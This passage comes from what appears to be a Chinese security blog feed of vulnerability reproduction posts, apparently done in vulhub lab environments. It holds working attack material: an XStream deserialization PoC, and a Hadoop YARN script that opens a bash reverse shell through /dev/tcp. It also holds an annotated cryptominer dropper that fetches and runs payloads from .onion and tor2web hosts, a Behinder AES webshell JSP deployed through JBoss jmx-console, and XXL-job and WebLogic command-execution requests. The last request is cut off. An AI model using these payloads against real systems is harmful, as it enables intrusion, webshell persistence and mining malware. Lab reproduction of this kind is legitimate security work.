Pocs.Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_26217</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        String payload = <span class="string">"&lt;map&gt;\n"</span> +</span><br><span class="line">                <span class="string">"  &lt;entry&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n"</span> +</span><br><span class="line">                <span class="string">"      &lt;flags&gt;0&lt;/flags&gt;\n"</span> +</span><br><span class="line">                <span class="string">"      &lt;value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"        &lt;dataHandler&gt;\n"</span> +</span><br><span class="line">                <span class="string">"          &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;contentType&gt;text/plain&lt;/contentType&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;is class='java.io.SequenceInputStream'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"              &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;iterator class='javax.imageio.spi.FilterIterator'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                  &lt;iter class='java.util.ArrayList$Itr'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;cursor&gt;0&lt;/cursor&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;lastRet&gt;-1&lt;/lastRet&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;outer-class&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                      &lt;java.lang.ProcessBuilder&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                        &lt;command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                          &lt;string&gt;calc&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                        &lt;/command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                      &lt;/java.lang.ProcessBuilder&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;/outer-class&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                  &lt;/iter&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                  &lt;filter class='javax.imageio.ImageIO$ContainsFilter'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;method&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                      &lt;name&gt;start&lt;/name&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                      &lt;parameter-types/&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;/method&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;name&gt;start&lt;/name&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                  &lt;/filter&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                  &lt;next/&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;/iterator&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;type&gt;KEYS&lt;/type&gt;\n"</span> +</span><br><span class="line">                <span class="string">"              &lt;/e&gt;\n"</span> +</span><br><span class="line">                <span class="string">"              &lt;in class='java.io.ByteArrayInputStream'&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;buf&gt;&lt;/buf&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;pos&gt;0&lt;/pos&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;mark&gt;0&lt;/mark&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;count&gt;0&lt;/count&gt;\n"</span> +</span><br><span class="line">                <span class="string">"              &lt;/in&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;/is&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;consumed&gt;false&lt;/consumed&gt;\n"</span> +</span><br><span class="line">                <span class="string">"          &lt;/dataSource&gt;\n"</span> +</span><br><span class="line">                <span class="string">"          &lt;transferFlavors/&gt;\n"</span> +</span><br><span class="line">                <span class="string">"        &lt;/dataHandler&gt;\n"</span> +</span><br><span class="line">                <span class="string">"        &lt;dataLen&gt;0&lt;/dataLen&gt;\n"</span> +</span><br><span class="line">                <span class="string">"      &lt;/value&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;string&gt;test&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"  &lt;/entry&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/map&gt;"</span>;</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示：</p><p><img src="/imgs/xstream.gif" alt="xstream"></p><p>参考链接：</p><p><a href="https://x-stream.github.io/CVE-2020-26217.html" target="_blank" rel="noopener">https://x-stream.github.io/CVE-2020-26217.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> XStream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化 </tag>
            
            <tag> XStream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Hadoop未授权访问漏洞getshell</title>
      <link href="2020/11/09/Apache-Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Egetshell/"/>
      <url>2020/11/09/Apache-Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Egetshell/</url>
      
        <content type="html"><![CDATA[<h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>vulhub+centos</p><h4 id="环境搭建步骤："><a href="#环境搭建步骤：" class="headerlink" title="环境搭建步骤："></a>环境搭建步骤：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> hadoop/unauthorized-yarn/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps查看状态</span><br></pre></td></tr></table></figure><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><p>1、采用以下脚本，修改相关URL/ip/port</p><figure class="highlight python"><figcaption><span>hadoop.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://192.168.116.132:8088/'</span></span><br><span class="line">lhost = <span class="string">'192.168.116.132'</span>  <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps/new-application'</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">print(resp.text)</span><br><span class="line">app_id = resp.json()[<span class="string">'application-id'</span>]</span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps'</span></span><br><span class="line">cmd = <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1'</span> % lhost</span><br><span class="line"><span class="comment"># cmd = 'touch /tmp/1234.ss'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'application-id'</span>: app_id,</span><br><span class="line">    <span class="string">'application-name'</span>: <span class="string">'get-shell'</span>,</span><br><span class="line">    <span class="string">'am-container-spec'</span>: &#123;</span><br><span class="line">        <span class="string">'commands'</span>: &#123;</span><br><span class="line">            <span class="string">'command'</span>: cmd,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'application-type'</span>: <span class="string">'YARN'</span>,</span><br><span class="line">&#125;</span><br><span class="line">print(data)</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><p>2、开启监听，这里我在hadoop本地开的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -ivvp 9999</span><br></pre></td></tr></table></figure><p>3、执行脚本即可</p><p><img src="/imgs/image-20201109210854299.png" alt="image-20201109210854299"></p><p>4、在这里记录下我的坑：docker启动hadoop后，发现有4个容器，刚开始不知道是哪个容器执行了命令，找了半天，最后发现触发执行命令的在nodemanager这个容器内，如果创建了文件，也是在这个容器才能找到。我的docker环境不能访问外网，在docker-compose.yml文件加了network_mode:host配置能访问外网了但是不能成功连接外网监听，最后直接在docker服务器上开启了监听才成功连接的。</p><p><img src="/imgs/image-20201109210958609.png" alt="image-20201109210958609"></p><h4 id="更新于11-13"><a href="#更新于11-13" class="headerlink" title="更新于11.13"></a>更新于11.13</h4><p>某天刷公众号看到<a href="https://mp.weixin.qq.com/s/Em8ZmqHY7N8DNQ3uJl16ag分析到了我上次遇到的坑，这里补充下：" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Em8ZmqHY7N8DNQ3uJl16ag分析到了我上次遇到的坑，这里补充下：</a></p><p>Hadoop2.0之后加入了YARN集群，Yarn集群的主节点承担了资源调度，Yarn集群的从节点中会选出一个节点（这个由redourcemanager决定）进行应用程序的调度。</p><h4 id="更新于11-16"><a href="#更新于11-16" class="headerlink" title="更新于11.16"></a>更新于11.16</h4><p>想起上次大佬服务器中了挖矿病毒，让我学习的挖矿就是跟这个漏洞有关，当时我没仔细去看，今天刚好分析下。于是问大佬要服务器环境，上去看了下貌似都清理干净了。</p><img src="/imgs/image-20201116184131459.png" alt="image-20201116184131459" style="zoom:50%;" /><p>于是去网上搜了下.unixdb.sh成功找到一篇心仪的文章<a href="https://blog.csdn.net/hy19930118/article/details/107129496/" target="_blank" rel="noopener">记一次Linux挖矿木马清除</a>学习了下，另外附上上次大佬给的学习地址：<a href="https://paper.seebug.org/611/" target="_blank" rel="noopener">Hadoop Yarn REST API 未授权漏洞利用挖矿分析</a></p><h4 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h4><p>大佬聊天记录给的脚本，分析脚本，发现该脚本主要功能是从远程地址下载恶意程序并执行，主要的代码注释如下</p><figure class="highlight sh"><figcaption><span>/home/yarn/.unixdb.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">HDtLGYpXoNJVjcOT+tWEIJWYO+veDD+ftynLBTXOMpFl8jur3TPmuWCQFvISC1t2</span><br><span class="line"><span class="built_in">exec</span> &amp;&gt;/dev/null <span class="comment">#不显示任何输出</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) <span class="comment">#先匹配到x:(id -u) 这行，然后根据:找到用户家目录，即在/etc/passwd中找到当前用户的家目录</span></span><br><span class="line">c=$(<span class="built_in">echo</span> <span class="string">"curl -4fsSLkA- -m200"</span>) <span class="comment"># -4:ipv4，-f:不输出错误，-sS:在选项 -s 中，当 curl 出现错误时将显示,-L:跟踪重定向,-k:不认证ssl，-A:User-Agent，-m：超时设置</span></span><br><span class="line">t=$(<span class="built_in">echo</span> <span class="string">"unixdbnuadxmwtob"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sockz函数功能：生成远程链接 并curl连接</span></span><br><span class="line"><span class="function"><span class="title">sockz</span></span>() &#123;</span><br><span class="line">n=(dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(<span class="built_in">echo</span> <span class="string">"dns-query?name=relay.tor2socks.in"</span>)</span><br><span class="line">s=$(<span class="variable">$c</span> https://<span class="variable">$&#123;n[$((RANDOM%12))]&#125;</span>/<span class="variable">$p</span> | grep -oE <span class="string">"\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b"</span> |tr <span class="string">' '</span> <span class="string">'\n'</span>|sort -uR|head -1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#在家目录或者tmp等文件下，新建文件i内容exit，赋予i执行权限，执行后删除i，执行成功一次后退出循环</span></span><br><span class="line"><span class="function"><span class="title">fexe</span></span>() &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$d</span> /tmp /var/tmp /dev/shm /usr/bin ;<span class="keyword">do</span> <span class="built_in">echo</span> <span class="built_in">exit</span> &gt; <span class="variable">$i</span>/i &amp;&amp; chmod +x <span class="variable">$i</span>/i &amp;&amp; <span class="built_in">cd</span> <span class="variable">$i</span> &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; <span class="built_in">break</span>;<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#u函数主要功能：从远程地址下载挖矿脚本到本地，赋予执行权限并执行，执行完就删除</span></span><br><span class="line"><span class="function"><span class="title">u</span></span>() &#123;</span><br><span class="line">sockz</span><br><span class="line">fexe</span><br><span class="line">f=/int.$(uname -m) <span class="comment">#操作系统多少位</span></span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-) <span class="comment">#获取日期md5值</span></span><br><span class="line"><span class="variable">$c</span> -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> || <span class="variable">$c</span> <span class="variable">$1</span><span class="variable">$f</span> -o<span class="variable">$x</span> <span class="comment">#socks5h代理，访问暗网地址下载挖矿脚本，并以日期的mad5命名</span></span><br><span class="line">chmod +x <span class="variable">$x</span>;<span class="variable">$x</span>;rm -f <span class="variable">$x</span> <span class="comment">#给脚本附加执行权限</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查恶意进程状态是否开启，未开始执行u函数</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; <span class="keyword">then</span></span><br><span class="line">u <span class="variable">$t</span>.<span class="variable">$h</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Apache Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBoss jmx-console未授权访问致GetShell复现</title>
      <link href="2020/11/06/JBoss-jmx-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%87%B4GetShell%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/06/JBoss-jmx-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%87%B4GetShell%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>最近在工作中又遇到jboss未授权，以前没做过这个漏洞getshell的复现，所以练习下</p><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>vulhub+centos7</p><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><p><a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_6" target="_blank" rel="noopener">冰蝎 v3.0_Beta_6</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">冰蝎自带shell.jsp如下，密码rebeyond</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123;String k=<span class="string">"e45e329feb5d925b"</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">"u"</span>,k);Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line">重命名为ma.jsp并制作war包</span><br><span class="line">jar -cvfM0 ma.war ma.jsp</span><br></pre></td></tr></table></figure><h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><p>搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;jboss&#x2F;CVE-2017-7504</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>搭建webshell下载地址，为了方便我直接在vulhub本地搭建的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先上传ma.war到服务器，然后在war所在目录执行下列命令即可搭建下载地址</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201110110311652.png" alt="image-20201110110311652"></p><p>找到deployment点进去</p><p><img src="/imgs/image-20201110110145393.png" alt="image-20201110110145393"></p><p>找到addURL()，这里在String类型后面填入war下载地址<a href="http://192.168.116.132/ma.war，然后点击invoke" target="_blank" rel="noopener">http://192.168.116.132/ma.war，然后点击invoke</a></p><p><img src="/imgs/image-20201106165056211.png" alt="image-20201106165056211"></p><p>返回成功，然后点击back to MBean View</p><p><img src="/imgs/image-20201110163834382.png" alt="image-20201110163834382"></p><p>查看URLList看到地址加载到了war下载地址，然后点击apply changes</p><p><img src="/imgs/image-20201110110122688.png" alt="image-20201110110122688"></p><p>需要等待一会然后刷新jmx-console页面，在web.deployment下面找到ma.war既可</p><p><img src="/imgs/image-20201110110022695.png" alt="image-20201110110022695"></p><p>访问<a href="http://192.168.116.132:8899/ma/ma.jsp没有报错，在冰蝎添加然后连接即可" target="_blank" rel="noopener">http://192.168.116.132:8899/ma/ma.jsp没有报错，在冰蝎添加然后连接即可</a></p><p><img src="/imgs/image-20201110162047785.png" alt="image-20201110162047785"></p><p><img src="/imgs/image-20201110162446522.png" alt="image-20201110162446522"></p><p><img src="/imgs/image-20201110162643069.png" alt="image-20201110162643069"></p><p>进行下一步反弹shell，用MSF来进行操作</p><p>选择反弹shell，然后选择Metepreter，下面会给出命令提示</p><p><img src="/imgs//image-20201221200502545.png" alt="image-20201221200502545"></p><p> 接着在kali里面msfconsole打开MSF，执行提示里面的命令</p><p><img src="/imgs//image-20201221200704050.png" alt="image-20201221200704050"></p><p>设置kali本地监听地址，端口监听4444，执行exploit进行监听</p><p><img src="/imgs//image-20201221200748648.png" alt="image-20201221200748648"></p><p>在冰蝎填写好监听地址，然后点击<code>给我连</code>按钮反弹shell到meterpeter</p><p><img src="/imgs//image-20201221201027350.png" alt="image-20201221201027350"></p><p><img src="/imgs//image-20201221201050352.png" alt="image-20201221201050352"></p><p>参考链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11240183.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11240183.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JBoss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 未授权 </tag>
            
            <tag> JBoss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXL-job任务调度平台 远程命令执行漏洞复现</title>
      <link href="2020/10/30/XXL-job%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/10/30/XXL-job%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/run</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:9999</span><br><span class="line"><span class="attribute">Content-Length</span>: 365</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "jobId": 1,</span><br><span class="line">  "executorHandler": "demoJobHandler",</span><br><span class="line">  "executorParams": "demoJobHandler",</span><br><span class="line">  "executorBlockStrategy": "COVER_EARLY",</span><br><span class="line">  "executorTimeout": 0,</span><br><span class="line">  "logId": 1,</span><br><span class="line">  "logDateTime": 1586629003729,</span><br><span class="line">  "glueType": "GLUE_SHELL",</span><br><span class="line">  "glueSource": "open -a Calculator",</span><br><span class="line">  "glueUpdatetime": 1586629003727,</span><br><span class="line">  "broadcastIndex": 0,</span><br><span class="line">  "broadcastTotal": 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">content-type</span>: text/html;charset=UTF-8</span><br><span class="line"><span class="attribute">content-length</span>: 12</span><br><span class="line"></span><br><span class="line">&#123;"code":200&#125;</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.cnblogs.com/tonglin0325/p/10161269.html" target="_blank" rel="noopener">https://www.cnblogs.com/tonglin0325/p/10161269.html</a></p><p><a href="https://github.com/jas502n/xxl-job#xxl-job-%E6%89%A7%E8%A1%8C%E5%99%A8-restful-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce" target="_blank" rel="noopener">https://github.com/jas502n/xxl-job#xxl-job-%E6%89%A7%E8%A1%8C%E5%99%A8-restful-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce</a></p><p><a href="https://www.jianshu.com/p/2d0974f33271?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation" target="_blank" rel="noopener">https://www.jianshu.com/p/2d0974f33271?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>]]></content>
      
      
      <categories>
          
          <category> XXL-job </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXL-job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic CVE-2020-14882未授权命令执行复现</title>
      <link href="2020/10/29/WebLogic-CVE-2020-14882%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/10/29/WebLogic-CVE-2020-14882%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>本次复现比较简单，直接利用以前的复现环境12.1.4进行的复现</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.140:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: ADM</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201029201819567.png" alt="image-20201029201819567"></p><p>更新回显POC</p><p>GET版</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread</span> current<span class="keyword">T</span>hread <span class="string">=</span> (weblogic.work.<span class="keyword">E</span>xecute<span class="keyword">T</span>hread)<span class="keyword">T</span>hread.current<span class="keyword">T</span>hread(); <span 